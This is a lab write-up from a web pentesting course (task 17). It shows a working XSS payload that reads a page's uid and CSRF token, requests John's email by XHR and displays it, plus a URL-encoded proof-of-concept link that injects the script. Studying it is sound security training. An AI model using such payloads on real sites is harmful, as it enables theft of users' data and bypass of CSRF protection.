## Task 17 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/17?csrf_token=87756351612121977981321312312123123126554427773)</small>

Objectives:

1. Find John's Email Address using an XSS vulnerability on this page
2. Display the Email address in the div with id "result"
3. No Hardcoded values can be used - everything has to be figured out dynamically

Well this time we have given the crsf token and uid. All we have to do is use it and send an XHR request to the following URL

![](https://i.ibb.co/GkcpnMm/image.png)

So let's use the knowledge from last [TASK_16](https://github.com/tbhaxor/pt-jsfp/blob/main/TASK_16.md) and complete this one

```js
const uid = document.querySelector("p#uid").textContent.trim().slice(4);
const tok = document.querySelector("p#csrf").textContent.trim().slice(6);
const xhttp = new XMLHttpRequest();

xhttp.onreadystatechange = function () {
  if (this.readyState == 4 && this.status == 200) {
    document.querySelector("#result").innerText = xhttp.responseText;
  }
};
xhttp.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/17/email?csrf_token=" + tok + "&uid=" + uid, true);
xhttp.send();
```

The [.trim()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/trim) is used to remove the leading and training whitespaces and [.slice(start)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/slice) is used to ignore first _n_ characters of the string

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/17?url=%3Cscript%3Econst%20uid%20%3D%20document.querySelector%28%22p%23uid%22%29.textContent.trim%28%29.slice%284%29%3B%0Aconst%20tok%20%3D%20document.querySelector%28%22p%23csrf%22%29.textContent.trim%28%29.slice%286%29%3B%0Aconst%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Axhttp.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20if%20%28this.readyState%20%3D%3D%204%20%26%26%20this.status%20%3D%3D%20200%29%20%7B%0A%20%20%20%20document.querySelector%28%22%23result%22%29.innerText%20%3D%20xhttp.responseText%3B%0A%20%20%7D%0A%7D%3B%0Axhttp.open%28%22GET%22%2C%20%22http%3A%2F%2Fpentesteracademylab.appspot.com%2Flab%2Fwebapp%2Fjfp%2F17%2Femail%3Fcsrf_token%3D%22%20%2B%20tok%20%2B%20%22%26uid%3D%22%20%2B%20uid%2C%20true%29%3B%0Axhttp.send%28%29%3B%3C%2Fscript%3E)
